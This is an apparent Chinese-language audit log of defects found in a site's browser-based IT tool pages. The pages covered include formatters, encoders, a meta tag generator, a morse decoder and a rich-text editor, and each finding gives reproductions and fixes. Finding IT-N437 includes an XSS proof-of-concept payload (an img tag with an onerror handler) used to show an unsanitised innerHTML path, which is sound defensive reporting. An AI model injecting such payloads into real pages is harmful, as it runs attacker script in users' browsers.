- 实读 8 页：`tools/it/gitignore-generator.html`、`tools/it/phone-qr.html`、`tools/it/protobuf-parser.html`、`tools/it/hmac-generator.html`、`tools/it/a1z26-cipher.html`、`tools/it/numeronym-generator.html`、`tools/it/markdown-editor.html`、`tools/it/clamp-calculator.html`（另读 `js/tool-kit.js` 的 `setValue`/`preset.bar`、`js/toolbox-stub.js` 的 `i18nText` 兜底）。
- 新增 24 条（高 6 / 中 15 / 低 3），编号 IT-N270~IT-N293；上一批止于 IT-N269，本批无重号。
- 未覆盖说明：只审计主流程、边界与文档口径，未穷举全部输入组合（gitignore 只核对模板全集与预设赋值，未逐栈检查每条规则是否过时；phone-qr 未实扫，结论为"无数据编码/纠错块"的构造性判定；protobuf 只测 map、非法文本、负数枚举与二进制输入，未覆盖 `extend`/`group`/aggregate option；hmac 未在非安全上下文实测 `crypto.subtle` 缺失路径；a1z26 只测大小写、重音、标点、数字与越界；numeronym 只测标点位置、短词与已有数字缩写；markdown 只做属性注入与 task list/# 层级；clamp 只算 3 组参数）。
- 未做验证：未改代码、未构建、未跑门禁、未 git 写、未开浏览器；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/t1.js`、`/tmp/t2.js`、`/tmp/t3.js`，未落仓库）；未验证英文态 `?lang=en-US`、繁体与移动端。

### 承诺 vs 实际（S 批专项）
- `tools/it/des.html:166`、`:263`：承诺"3DES 密钥 112/168 位""维护老系统时解密历史数据"，实际密钥编排只剩 1 字节有效、输出与标准不兼容（N294、N295）；`:155` 的"解密时纯十六进制且偶数长度按 hex、否则 Base64"实现一致，但奇数 hex 会抛 `InvalidCharacterError`（N296）。
- `tools/it/js-formatter.html:225` 承诺"纯格式化不会改变代码行为，AST 不变"，实际注释换行与 `return` ASI 均改变语义（N297）；`:167` 写"必须基于 AST 而非简单正则"，本页是手写词法 + 深度计数（`:163`），压缩还不补分号（N298）。
- `tools/it/python-formatter.html:170` 承诺"统一空格"，实测 `x={1:2,3:4}` 原样输出；`:219` 示例"`x={1:2,3:4}` → `x = {1: 2, 3: 4}`"不成立；`:223` 的"成熟工具只做等价改写"不适用于本页（N300、N301）。
- `tools/it/csv-to-html-table.html:128` 承诺"右侧实时预览渲染效果"、`:117` 承诺生成表头区与 th，实际产物在 `:314` 被覆盖成闭合标签（N303）。
- `tools/it/latex.html:112` 承诺"输入关键词…即时筛选"，实际无 input 监听（N305）；`:160` 的"复制到编辑器即可渲染"对 `\matrix`、`\begin{cases}` 等片段（`:201`）不成立。
- `tools/it/country-flag.html:235` 的引据写"国家码 1-3 位 / E.164"，数据无 dial 字段（N308）；数据仅 48 条却以"国家代码与旗帜"整体名义提供（N309）。
- `tools/it/decimal-encode.html:10` 的 meta 写"每个字节 0–255"（与实现一致），但 `:147`/`:206` 写 Unicode 码点、`中`=20013（N311）；`:166` 提供"无分隔符"却产出自解码器拒绝的串（N310）。
- `tools/it/hex-to-text.html:204` 承诺"不行再换 GBK"，页面无字符集选项（N313）；`:203` 的"奇数位缺位会报格式错误"实现正确。

### 覆盖
- 实读 8 页：`tools/it/country-flag.html`、`tools/it/js-formatter.html`、`tools/it/hex-to-text.html`、`tools/it/des.html`、`tools/it/latex.html`、`tools/it/decimal-encode.html`、`tools/it/python-formatter.html`、`tools/it/csv-to-html-table.html`。
- 新增 21 条（高 8 / 中 9 / 低 4），编号 IT-N294~IT-N314；上一批止于 IT-N293，本批无重号。
- 未覆盖说明：只审计主流程、边界与文档口径，未穷举全部输入组合（DES 只逐字节改 0x11 观察敏感性，未做全密钥空间统计；JS 只测 5 组输入；Python 只测自带 SAMPLE 与 2 个小例；CSV 只测默认数据与引号/换行字段；country 只做数据一致性与长度统计，未核对全部国名/首都时效）。
- 未做验证：未改代码、未构建、未跑门禁、未 git 写、未开浏览器；结论为源码静态分析 + `node` 内存复算（临时脚本 `/tmp/audit_des.js`、`/tmp/audit_fmt.js`、`/tmp/audit_misc.js`，未落仓库）；DES 标准向量因本机 OpenSSL 无 `des-ecb` 采用 FIPS 公开值（key `0123456789ABCDEF` / 明文 `Now is t` → `3FA40E8A984D4815`）；未验证英文态 `?lang=en-US`、繁体与移动端。

## T 批 IT 第 1 轮覆盖（2026-11-04）
- 本轮审计 24 页：`pdf-signature-checker`、`emoji-meaning`、`octal-encode`、`random-string`、`xml-to-json`、`mongodb-cheatsheet`、`vector-dot-product`、`ulid-generator`、`calc-subnet`、`generator-16`、`http-methods`、`gamertag-generator`、`sql-cheatsheet`、`stopwatch`、`ecdsa`、`barcode-itf`、`yaml-to-json`、`json-to-yaml`、`xml-validator`、`uuid-v7-generator`、`otp-generator`、`matrix-multiplier`、`url-encoder-advanced`、`hash`（均为 `tools/it/<slug>.html`）。
- 新增 19 条（高 13 / 中 6），编号 IT-N315~IT-N333；上一批止于 IT-N314，本批无重号。
- 假工具候选 2 页：`pdf-signature-checker`（类型 C：宣称 PKCS#7/证书链验签，实为 ByteRange+Contents 存在性匹配）、`generator-16`（类型 A：仅按数量轮转固定 15 条硬编码 .env 键值，无随机生成）。
- 无高优、仅记录覆盖的页面：`emoji-meaning`、`mongodb-cheatsheet`、`vector-dot-product`、`ulid-generator`、`http-methods`、`sql-cheatsheet`、`stopwatch`、`ecdsa`、`xml-validator`、`uuid-v7-generator`、`url-encoder-advanced`（逐页读主流程与边界，未发现可复现的高优缺陷）。
- 数值核验：MD5/CRC32/Adler-32 与 RFC 4226/6238 测试向量、base32 解码、PDF 头字节偏移、ByteRange 差值均用 `node -e` 实算（`md5("abc")=900150983cd24fb0d6963f7d28e17f72`、`crc32("abc")=352441c2`、`adler32("abc")=024d0127`、`HOTP(c=0)=755224`、`TOTP(t=59,8位)=94287082`）。
- 未做浏览器/门禁/线上验证（未改工具页与构建产物、未跑 `_build.py`/`run_gates.py`、未做 git 写、未开浏览器）。

## T 批 IT 第 2 轮覆盖（2026-11-04）
- 本轮审计 24 页：`binary-encode`、`baudot-code`、`c-string-escape`、`xxencode`、`uuencode`、`quoted-printable`、`html-entity-encoder`、`html-escape`、`js-escape`、`java-escape`、`go-escape`、`php-escape`、`rust-escape`、`sql-escape`、`css-escape`、`python-escape`、`text-to-binary`、`text-to-decimal`、`text-to-hex`、`text-to-octal`、`rot-cipher`、`xor-cipher`、`polybius-cipher`、`json-to-tsv`（均为 `tools/it/<slug>.html`）。
- 新增 14 条（高 10 / 中 4），编号 IT-N334~IT-N347；第 1 轮止于 IT-N333，本批无重号。
- 假工具候选 0 页（24 页均有真实编码/转义/转换逻辑，未发现纯回显或静态壳）。
- 无高优、仅记录覆盖的页面：`binary-encode`、`quoted-printable`、`html-entity-encoder`、`js-escape`、`java-escape`、`sql-escape`、`css-escape`、`text-to-binary`、`text-to-decimal`、`rot-cipher`（逐页读主流程与边界，未发现可复现的高优缺陷）。
- 数值核验：C/Go/PHP/Python 转义、HTML 实体、CSS 跳过、hex/octal 前缀拼接、hex 解析均用 `node` 复刻原函数实算（`\101`→`101`、`\x4e2d`→`N2d`、`&#55357;`、`48\\x69`、`110\\145`、`parseFloat("12345678901234567890")=12345678901234567000`）。
- 未做浏览器/门禁/线上验证（未改工具页与构建产物、未跑 `_build.py`/`run_gates.py`、未做 git 写、未开浏览器）。

## T 批 IT 第 3 轮覆盖（2026-11-04）
- 本轮审计 8 页（均为 `tools/it/<slug>.html`）：`regex-visualizer`、`jwt-debugger`、`hash-identifier`、`json-repair`、`json-to-xml`、`yaml-to-xml`、`csv-to-yaml`、`toml-to-yaml`。
- 新增 18 条（高 8 / 中 10），编号 IT-N348~IT-N365；第 2 轮止于 IT-N347，本批无重号。
- 假工具候选 0 页：8 页均有真实转换/解析逻辑（JWT 生成器例外，见 IT-N349）。


### 覆盖清单（T 批 IT 第 3 轮）
- `jwt-debugger`：IT-N349（高）。
- 方法声明：以上结论仅基于源码通读 + `node` 复刻页面原函数实算（json-repair / hash-identifier / yaml-to-xml / toml-to-yaml / csv-to-yaml / json-to-xml 的判定均给出「输入 → 实际 / 期望」），未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证；未修改任何工具页或构建产物。

## T 批 IT 第 4 轮覆盖（2026-11-04）

### IT-N366 长文本比较在每次按键都重建两张全尺寸 DP 矩阵，8000 字符即约 1.6GB（高，确认缺陷）
- 问题：`autoCalc()` 绑定在 `oninput`，每次输入都跑 `levenshtein()` 与 `computeDiff()`，两者各自分配 `(m+1)×(n+1)` 的二维数组，且 `levResult.matrix` 在 `computeDiff` 建表期间仍被持有。输入框无 `maxlength`、代码也无长度上限。
- 证据：`tools/it/text-similarity.html:189`、`:194`（`oninput="autoCalc()"`）、`:430-431`、`:497-517`（Levenshtein 全矩阵）、`:556-568`（LCS 全矩阵）、`:656`、`:725`
- 复现（node 复刻）：A/B 各 8000 字符 → 矩阵 64,016,001 格，单次 Levenshtein 810ms、峰值内存 819,633,824 B（约 782MB）；页面同时还要再建一张同规模 LCS 表，峰值约 1.5–1.6GB，且每个按键都重跑一遍；期望：对超过阈值（如 2000 字符）的输入提示「文本过长」并停止自动计算，或改用双行滚动 DP + Myers diff。
- 影响：粘贴两段长文本（代码 diff 是本工具典型用法）后逐字输入即长时间卡死；移动端/低内存设备直接 OOM 崩溃，结果区永远算不完。
- 方案：`levenshtein` 只保留两行滚动数组（回溯改为 ops 栈），`computeDiff` 用线性空间 Myers；同时在 `autoCalc` 前对 `max(lenA,lenB)` 设阈值（超限提示「文本过长」并停止计算），`oninput` 改防抖。

### 覆盖清单（T 批 IT 第 4 轮）
- `text-similarity`：IT-N366（高）。
- 方法声明：本轮仅基于上述 8 页源码通读 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。

## U 批 · IT 查询/编码表（2026-11-04）

### IT-N423 国家代码表仅 62 条，冰岛/卢森堡/柬埔寨等常见国家查不到（中，确认缺陷）
- 页面：`tools/it/country-code-lookup.html`
- 问题：`COUNTRIES` 仅收录 62 个 ISO 3166-1 alpha-2 条目（`:234-297`），而标准共 249 个；未命中即输出「❌ 未找到匹配的国家」（`:317-319`），也不支持 `UK`/`USA` 这类常见别名。
- 行号：`:234-297`、`:302-315`、`:317-319`
- 复现：输入 `IS` → 实际「❌ 未找到匹配的国家」；期望 Iceland / `+354` / ISK。实测 `LU`、`EE`、`SK`、`SI`、`KH`、`MM`、`NP` 均无条目；`UK`、`USA` 也查不到。
- 影响：作为「国家代码查询」工具覆盖面不足四分之一，常见查询直接失败。
- 假工具：否（数据缺口）

### 覆盖清单（U 批 IT 查询/编码表）
- `country-code-lookup`：IT-N423（中）；无高优缺陷（已收录条目的字段本身正确）。
- 方法声明：本轮仅通读上述 10 页源码 + `node` 在 `/tmp` 复刻页面原函数实算（每条均给出「输入 → 实际 / 期望」），**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。

## V 批 · IT 生成/校验/计算（2026-11-04）

### IT-N428 meta 生成器的 twitter:title / twitter:description 写死为本站文案，完全忽略用户输入（高，假功能）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：`calcTool` 里 og:title / og:description 用的是用户输入 `t` / `d`（`:230-231`），但 twitter 卡两行直接拼了本工具自己的标题与简介常量（`:236-237`），与输入的 `t`、`d` 无关。原理说明还写着「社交：……以及 Twitter Card 的 twitter:card 等」（`:105`），暗示按输入生成。
- 行号：`:227-238`（核心 `:236`、`:237`）
- 复现：`title=我的站点`、`description=这是站点描述`、`url=https://example.com/` → 实际输出 `twitter:title="Meta 标签生成器 - 免费在线开发工具"`、`twitter:description="Meta 标签生成器是一款免费的在线IT 开发工具，……"`；期望 `twitter:title="我的站点"`、`twitter:description="这是站点描述"`。
- 影响：用户复制整段 meta 后，Twitter/X 分享卡片显示的是本工具的名字与简介，与其站点无关；且 twitter:description 里还有重复两遍的套话。
- 方案：改为 `'<meta name="twitter:title" content="'+t+'">'`、`…content="'+d+'">'`，与 og 两行同源。
- 假工具：否（核心输出错误）

### IT-N429 说明把 viewport 列为「必需」，生成结果却完全没有 viewport / charset / robots / keywords（中，承诺未实现）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：原理框列出「基础」五项含 keywords、viewport、robots、charset（`:104`），并强调「viewport 是移动端正确适配的前提，缺失会触发桌面版缩放」（`:107`）；但 `calcTool` 只输出 `<title>`、`description`、`og:*`、`twitter:*`（`:228-238`），页面也没有这些字段的输入控件。
- 行号：`:104-107`（说法）、`:223-238`（实现）
- 复现：输入 `title=T`、`description=D`、`url=https://example.com/` → 实际输出 9 行，无 `<meta name="viewport">`、无 `<meta charset>`、无 `robots`、无 `keywords`；期望至少输出 `viewport`（或明确标注「不含 viewport」，由用户自加）。
- 影响：工具名叫「Meta 标签生成器」、说明也称「生成完整 meta 片段」，但用户把结果贴进 `<head>` 后移动端仍走桌面缩放，必须自己补标签。
- 假工具：否（功能缺口）

### IT-N430 用户输入里的双引号未转义，复制出的 meta 标签属性被提前闭合（中，确认缺陷）
- 页面：`tools/it/meta-tags-generator.html`
- 问题：`escH` 走 `div.textContent → innerHTML`（`:221`），HTML 文本节点序列化只转义 `& < >`，不转义 `"`；随后把整段字符串塞进 `<pre>` 展示（`:229-231` 的 `content="'+d+'"`）。用户据此复制粘贴得到的是原始双引号。同一行末的 `replace(/Infinity|NaN/g,'—')` 还会把用户文本里的 `NaN` / `Infinity` 字样改写为「—」。
- 行号：`:221`、`:228-234`、`:236-237`
- 复现：`description=He said "hi"` → 实际展示并可复制 `<meta name="description" content="He said "hi"">`，粘贴后属性在 `He said ` 处闭合，description 被截成 `He said `；期望 `content="He said &quot;hi&quot;"`。另：`title=NaN` → 实际显示 `—`。
- 影响：description/og/twitter 任一字段含引号（常见于引用型文案、含英寸/尺寸的文案）都会产出坏 HTML，页面本身不报错，难以发现。
- 方案：拼装时对字段单独做 `&quot;` 转义（或在 `escH` 里补 `"`/`'`），并把 NaN/Infinity 兜底只施加于数值结果、不施加到用户文本。
- 假工具：否

### IT-N431 CSS 压缩在引号字符串内照常删空白与 `: ; , > }`，合法 CSS 被静默改义（高，确认缺陷）
- 页面：`tools/it/css-minify.html`
- 问题：`minify` 是 4 条全局正则（`:216-221`），不区分字符串/`url()`：`\s*([{}:;,>])\s*`（`:219`）会把 `content:"a: b"` 里的 `:` 后空格删掉，`\s+/g→' '`（`:218`）把字符串内连续空格压成一个，`;\}`（`:220`）把字符串内的 `;}` 也删掉。页面却承诺「压缩仅去注释与空白，不改变选择器与声明语义」（`:168`），只是在 `:176` 含糊提了一句 content 特殊空格。
- 行号：`:216-221`（核心 `:218-220`）、`:168`、`:176`、`:224`
- 复现（node 复刻页内 `minify`，输入 → 实际）：
  - `.a::after{content:"a: b";}` → `.a::after{content:"a:b"}`（渲染文本由 `a: b` 变成 `a:b`）
  - `.a::after{content:"x; }";}` → `.a::after{content:"x}"}`（少了 `; `）
  - `.a::after{content:"A  B";}` → `.a::after{content:"A B"}`
  - `.a[title="a, b"]{color:red}` → `.a[title="a,b"]{color:red}`（属性选择器不再匹配原值）
  - 期望：字符串 / `url()` 内容原样保留，仅压缩字符串外空白。
- 影响：图标字、`content` 文案、属性选择器值会被改掉，且压缩结果看起来正常、只在上线后表现为文案或匹配错；对「压缩器」而言属输出错误而非样式问题。另 `:231` 的 `replace(/Infinity|NaN/g,'—')` 会把 CSS 里的 `.NaN` 选择器改写成 `.—`。
- 方案：先把 `"…"` / `'…'` / `url(…)` 用占位符替换，压缩完再还原（或写 tokenizer）；去掉对整段 HTML 的 NaN/Infinity 替换。
- 假工具：否

### IT-N432 短链页「复制」把「短链 + 原始 URL」拼在一起写入剪贴板（中，假功能）
- 页面：`tools/it/tiny-url.html`
- 问题：结果区同时渲染两行（`code-row` 短链、`原始 URL: …`，`:280`），`copyResult` 直接取 `#output` 的 `textContent`（`:295`）复制；两个 div 的文本没有分隔符，`textContent` 拼成 `短链原始 URL: 长链`。同时 `writeText(...).then(...)` 没有 `.catch`（`:296`），写入失败时静默无提示。
- 行号：`:280`、`:294-296`
- 复现：输入 `https://example.com/a?x=1`，生成后点「复制」→ 剪贴板实际内容 `https://tinyurl.com/AbC123原始 URL: https://example.com/a?x=1`；期望仅 `https://tinyurl.com/AbC123`。真机粘贴到聊天框即可复现。
- 影响：短链工具的核心动作产出不可直接使用的字符串，用户需手工截断；这也是该页唯一的「出站」路径。
- 方案：复制 `state` 里保存的短链（或单独 `#shortCode` 元素的文本），并对 `writeText` 补 `.catch` 提示。
- 假工具：否（页面已声明是「短链效果演示」，非真缩短服务）

### IT-N433 标准差的数据解析静默丢弃非数字项、并截断半数字符串，n 与结果随之失真（中，确认缺陷）
- 页面：`tools/it/standard-deviation.html`
- 问题：`parseData` 用 `parseFloat` + `isNaN` 过滤（`:256`），既不做整串校验也不报错：`abc` 之类整段被丢弃，`12abc` 被截成 `12`，`0x10` 被解析成 `0`；页面照常以「n=…」的确定口吻输出均值/方差/标准差。
- 行号：`:256`、`:258-262`、`:268`
- 复现（node 复刻页内 `parseData`/`calculate`）：
  - `1,2,3,abc` → 实际 `n=3`、`x̄=2`、`s=1`；期望提示「abc 不是有效数字」并拒绝计算（或明确列出被忽略项）。
  - `12abc, 3` → 实际按 `12, 3` 计算（s=6.364）；`0x10, 5` → 实际按 `0, 5` 计算（s=3.536）。
- 影响：从表格粘贴一列数据时，表头（如 `value`）会被无声吃掉，n 少 1、s 变化，而输出界面上没有任何异常信号，用户会误信结果。
- 方案：改用 `Number(s)` 并校验 `Number.isFinite`，非法 token 收集后提示；`12abc`、`0x10` 这类应报错而不是截断。
- 假工具：否

### IT-N434 CAA 生成器对域名不做任何校验，完整 URL / 含空格 / 大写域名都原样输出成「记录」（中，确认缺陷）
- 页面：`tools/it/caa-record-generator.html`
- 问题：`gen()` 只做 `trim()` 和去掉前导点（`:281`），随后直接把 `d` 拼进记录（`:297`），没有 hostname 合法性检查、没有小写归一、也不补结尾点；而 deep-dive 示例给的是带结尾点的 `example.com. CAA 0 issue "letsencrypt.org"`（`:181`），与输出格式不一致。
- 行号：`:281`、`:287-298`（核心 `:297`）、`:181`
- 复现：`domain=https://example.com`、勾选 Let's Encrypt → 实际输出 `https://example.com  CAA  0 issue "letsencrypt.org"`；期望拒绝并提示「请填写裸域名 example.com」。`domain=example com` → 输出 `example com  CAA …`；`Example.COM` → 保持大写不被归一。
- 影响：输出框被当作可直接粘贴的记录，非法 owner name 会被 DNS 服务商拒绝或写坏 zone；再者按 RFC 1035 主文件相对名规则，不带结尾点在 BIND zone 里会被拼上 `$ORIGIN`，指向错误的域名。
- 方案：`new URL`/正则校验 hostname（仅 `[a-z0-9.-]`、至少一个点、非 IP），统一小写，输出可选补 `.`。
- 假工具：否

### IT-N435 验证码「排除易混淆字符」在纯数字 / 纯字母模式下可见但代码未生效（中，承诺未实现）
- 页面：`tools/it/captcha-generator.html`
- 问题：`setType` 只在 `math`/`cn` 时隐藏该勾选框（`:921-924`），所以「纯数字」「纯字母」下勾选框仍然显示；但过滤逻辑只写在 `alnum` 分支（`:615-619`），`num` 分支死用 `0123456789`（`:588`），`alpha` 分支死用大小写字母表（`:596-604`），均未读 `state.excludeConfused`。默认预设「8个深色」还专门勾了这个选项（`:1081`）。
- 行号：`:344-346`、`:588-592`、`:596-604`、`:615-619`、`:921-924`、`:952-955`
- 复现：类型选「纯数字」+ 勾选「排除易混淆字符(0/O/o/I/l/1)」→ 实际仍生成如 `1010`、`0183`（含 0/1）；类型选「纯字母」+ 勾选 → 实际仍出现 `I`、`l`、`O`、`o`。期望结果中不含 `0OoIl1`。
- 影响：用户以为已规避易读错字符，实测仍出现，抄写验证码时按 0/O、1/l 混淆导致「验证失败」；对一个验证码示例工具而言等于选项无效。
- 方案：把过滤抽成公共函数对 `num`、`alpha`、`alnum` 的字符池统一应用（`num` 过滤后剩 8 位，需保证长度上限）。
- 假工具：否

### IT-N436 CSS 属性表把 `vertical-align` 登记了两条（不同分类、不同描述），统计与检索出现重复（中，确认缺陷）
- 页面：`tools/it/css-properties.html`
- 问题：`PROPERTIES` 里同名条目出现两次：`:379`（`cat:'文本'`，desc「垂直对齐」）与 `:454`（`cat:'表格'`，desc「表格垂直对齐」），其余字段仅 values 顺序不同。`renderProps` 不去重，`stats` 直接显示 `filtered.length`（`:493`）。
- 行号：`:379`、`:454`、`:482-493`（核心 `:493`）
- 复现：页面计数实际显示「共 133 个属性」（去重后为 132）；搜索框输入 `vertical-align` → 实际返回两张同名卡片，分别落在「文本」「表格」两个分类标签下，值为 `baseline, sub, super…` 与 `baseline, top, middle…`；期望只有一条，值表合并。
- 影响：属性总数与检索结果重复，且同一属性给出两套不同的取值顺序，用户会以为存在两个不同属性。
- 方案：删除 `:454` 那条（它落在「表格」分类，`vertical-align` 本就属文本/行内对齐），或在渲染前按 `name` 去重。
- 假工具：否

### 覆盖清单（V 批 IT 生成/校验/计算）
- `css-properties`：IT-N436（中）；无高优缺陷（属性值/初始值/继承性抽查未发现错误）。
- `meta-tags-generator`：IT-N428（高）、IT-N429、IT-N430（中）。
- `sqlite-cheatsheet`：无高优/中优缺陷（命令语法、`.mode`/JSON1/窗口函数示例与版本注记抽查正确；Chart/Table 双视图与检索联动正常）。
- `standard-deviation`：IT-N433（中）；无高优缺陷（sample/population 公式与 32/7≈4.57、s≈2.138 复算一致）。
- `tiny-url`：IT-N432（中）；无高优缺陷（随机短码生成与历史去重逻辑正常）。
- `css-minify`：IT-N431（高）。
- `caa-record-generator`：IT-N434（中）；无高优缺陷（CAA 记录语法、flag 128 关键位、iodef mailto 形式正确）。
- `captcha-generator`：IT-N435（中）；无高优缺陷（四种类型出题、数学答案校验、大小写归一逻辑正确）。
- 方法声明：本轮逐页通读上述 8 页源码，用 `node` 在 `/tmp` 复刻页面原函数实算（`minify`、`parseData/calculate`、`PROPERTIES` 去重）并给出「输入 → 实际 / 期望」；**未开浏览器、未跑 `_build.py`/`run_gates.py`、未做线上验证**；未修改任何工具页、代码或构建产物，仅在审计日志追加本节。IT-N430 的引号未转义依据 HTML 文本节点序列化规则判定（`& < >` 转义、引号不转义），未做真机粘贴验证；两处 `</div`（缺 `>`，`meta-tags-generator.html:124`、`css-minify.html:127`）会吞掉紧随的 `<div class="toolbar">` 开标签，属结构/布局问题，未计入本批条目。

## V 批 · IT 编辑器/安全/编码（2026-11-04）

### IT-N437 源码应用与 HTML 导入直接写 `innerHTML`，事件属性在页面源执行（高，安全缺陷）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`applySource()` 把源码框原文直接赋给 contenteditable 的 `innerHTML`（`:424`）；`loadFile()` 把导入文件内容同样直接赋值（`:548`）。两条路径都没有标签/属性白名单，`<img src=x onerror=…>` 之类的内联事件会在本页源执行。页内说明却写着「粘贴内容必须净化，输出 HTML 前必须过滤，否则极易引入 XSS」（`:124`）、FAQ「通常做净化防止 XSS」（`:249`）、标准表「输出净化」（`:273`），实际一处净化都没有（全文无 sanitize/DOMPurify 实现）。另外 `showResult` 把导入文件名直接拼进 `innerHTML`（`:550`）。
- 行号：`:424`、`:548`、`:550`（说明 `:124`、`:249`、`:273`）
- 复现：源码框粘贴 `<img src="x" onerror="alert(document.domain)">` → 点「✓ 应用到编辑区」→ 实际弹窗显示当前域名（图片加载失败即触发）；期望 `onerror` 被剥除或作为纯文本插入。导入文件名为 `<img src=x onerror=…>.html` 时，`:550` 同样执行。
- 影响：任何下载来的 HTML 模板/他人给的 `.html` 文件，导入后即可在本站源执行任意脚本，读写本站 localStorage、改写页面；用户把该工具当"本地编辑"用，不会预期导入即执行脚本。
- 方案：赋值前用 DOMPurify（或白名单清洗）过滤 `script/iframe/on*`；文件名用 `textContent` 拼接。
- 假工具：否

### IT-N438 有序列表导出 Markdown 时编号丢失，全部变成无序列表（中，功能缺口）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`walk()` 对 `li` 一律输出 `'\n- '`（`:479`），`ul`/`ol` 只做内容透传（`:480`），不区分父标签、也不读 `start`/序号；公式 :119 虽写明"li 前加 `- `"，但结果是把有序列表的编号语义抹掉。
- 行号：`:479-480`
- 复现：编辑区写有序列表「1. 第一步 / 2. 第二步」→ 点「复制 Markdown」→ 实际 `- 第一步\n- 第二步`；期望 `1. 第一步\n2. 第二步`。
- 影响：粘贴到文档/README 后步骤编号消失，顺序语义丢失；页面 :291 只说"近似转换"，未提示有序列表会被降级。
- 方案：`walk` 传入父标签，`ol` 内的 `li` 用递增序号输出。
- 假工具：否

### IT-N439 `prettyHtml` 逐行 `trim`，代码块缩进经源码框往返后丢失（中，确认缺陷）
- 页面：`tools/it/rich-text-editor.html`
- 问题：`prettyHtml()` 在 `></` 处断行后对每一行 `.trim()`（`:406`），`syncSource()`/`syncToSource()`/`applySource()` 都以它为准（`:413`、`:416`、`:424`），因此 `<pre>` 内的行首缩进也被删掉。
- 行号：`:402-409`（核心 `:406`）、`:410-427`
- 复现：编辑区代码块 `<pre>function f(){\n  if (a) {\n    return 1;\n  }\n}</pre>` → 依次点「↻ 从编辑区刷新」「✓ 应用到编辑区」→ 实际 `<pre>function f(){\nif (a) {\nreturn 1;\n}\n}</pre>`（`node` 复刻 `prettyHtml` 输出 `"<pre>function f(){\nif (a) {\nreturn 1;\n}\n}</pre>"`）；期望缩进原样保留。
- 影响：代码块内容只要经过一次源码区往返就被破坏；Python/YAML/Makefile 等缩进敏感代码直接失效，而页面主打"代码块 + 往返编辑"。
- 方案：格式化时跳过 `<pre>`/`<code>` 内部内容，或只插换行不做 `trim`。
- 假工具：否

### IT-N440 「增强版/自动推断时间单位/容错」完全未实现，无分隔电码一律解成 `?`（高，假工具）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：标题与说明承诺「增强版」「自动推断时间单位，容忍多余空格、缺失分隔与轻微噪声」「把连续符号按长度阈值判为点或划，再按间隔长度切分字符与单词」（`:153-159`、`:219`、`:223`）；但 `dec()` 只有三步：按 `/\s*\/\s*|\s{2,}/` 切词、按单空格切字符、精确查表，未命中一律 `?`（`:316-327`），根本没有阈值/时长推断。`dec()` 也不处理一行内连续符号。
- 行号：`:316-327`（承诺 `:153-159`、`:219`、`:223`）
- 复现：输入 `...---...`（无分隔的 SOS）→ 实际 `?`（`node` 复刻 `dec` 同结果）；期望 `SOS`。`..- --- ...` 之类"轻微噪声"也无任何容错。
- 影响：以"增强版"为卖点的核心能力不存在，用户按宣传输入不规范电码只会得到 `?`；本质是精确查表版，属名不符实的假工具。
- 方案：要么真正实现自适应切分（文本输入需先约定点划时长），要么把标题/文案改成"精确查表版"并删掉容错承诺。
- 假工具：是

### IT-N441 「DIT DAH」样式的编码结果无法解码回原文（中，编码往返不一致）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：`styleCode()` 在 word 样式把每个码元用单空格连接（`:296`），而 `dec()` 把单空格当作字符分隔（`:321`），于是 `DIT DAH` 序列被逐个符号当成一个字符。
- 行号：`:296`、`:320-323`（核心 `:322`）
- 复现：输入 `SOS`、样式选 `DIT DAH` → 输出 `DIT DIT DIT DAH DAH DAH DIT DIT DIT`；原样点「解码」→ 实际 `EEETTTEEE`（`node` 复刻一致）；期望 `SOS`。
- 影响：三种样式里唯一带可读单词的样式产出不可逆结果，编码→解码闭环失效。
- 方案：word 样式用双空格/`/` 分隔字符，或在 `dec` 里先按双空格切字符、单空格切码元。
- 假工具：否

### IT-N442 `&`、`+`、`=` 与 prosign 共用同一码，解码被覆盖成 `<AS>`/`<AR>`/`<BT>`（中，确认缺陷）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：`REVERSE` 先由 `MORSE` 填充，随后 `PROSIGNS` 覆盖同名码（`:288-289`）；三组冲突：`&`/`<AS>`=`.-...`、`+`/`<AR>`=`.-.-.`、`=`/`<BT>`=`-...-`。
- 行号：`:280-281`、`:283-285`、`:288-289`
- 复现：编码 `&` → `.-...` → 再解码实际 `<AS>`；`+` → `<AR>`；`=` → `<BT>`（`node` 复刻）。期望还原原标点。
- 影响：任意包含 `& + =` 的电码解码后都变成 prosign，报文内容被改写，且没有任何提示。
- 方案：prosign 与字符码分开存放，解码按上下文/优先级判定，或编码时避开冲突表示。
- 假工具：否

### IT-N443 编码不支持 Prosigns 记号，`<AR>` 被拆成 `A R`（中，承诺未实现）
- 页面：`tools/it/morse-decode-advanced.html`
- 问题：说明称「含字母、数字、标点符号、Prosigns（特殊信号）」（`:162`），码表也列出 `<AA>`…`<SN>`（`:283-285`）；但 `enc()` 逐个单字符查 `MORSE`（`:307-311`），`<`、`>` 不在表中被静默丢弃，prosign 标记永远不会被识别。
- 行号：`:162`、`:283-285`、`:307-311`
- 复现：输入 `<AR>` → 实际 `.- .-.`（A R）；期望 `.-.-.`。`<SK>` → 实际 `... -.-`（S K），期望 `...-.-`。
- 影响：prosign 只能解不能编，宣传的字符集不成立；用户以为发出了"消息结束"，实际发了两个字母。
- 方案：`enc()` 先用 `/<[A-Z]{2}>/` 整体匹配 `PROSIGNS`，再逐字符编码。
- 假工具：否

### IT-N444 「倒序」按 UTF-16 码元反转，emoji/辅助平面字符被拆成无效代理项（中，编码往返不一致）
- 页面：`tools/it/string-obfuscator.html`
- 问题：`result=text.split('').reverse().join('')`（`:290`）按码元反转，代理对被打散。
- 行号：`:290`
- 复现：输入 `😀a` → 实际 `a\uDE00\uD83D`（`node` 实测 JSON 为 `"a\ude00\ud83d"`，渲染为 `a` + 乱码/替换符）；期望 `a😀`（`Array.from` 反转）。
- 影响：含 emoji、生僻字（辅助平面）的文本倒序后产生孤立代理项，输出不可读且不可还原。
- 方案：改为 `Array.from(text).reverse().join('')`。
- 假工具：否

